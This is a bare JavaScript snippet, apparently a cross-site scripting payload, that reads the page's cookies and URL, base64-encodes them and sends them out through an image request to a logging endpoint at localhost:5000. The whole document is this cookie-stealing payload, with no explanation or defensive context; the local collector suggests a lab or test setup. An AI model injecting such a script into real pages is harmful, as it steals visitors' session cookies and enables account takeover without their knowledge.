(function(){
    var cookie = document.cookie;
    var location = window.location.href;

    var data = btoa("Cookies: " + cookie + " | URL: " + location);
    new Image().src = "http://localhost:5000/log?data=" + data;
})();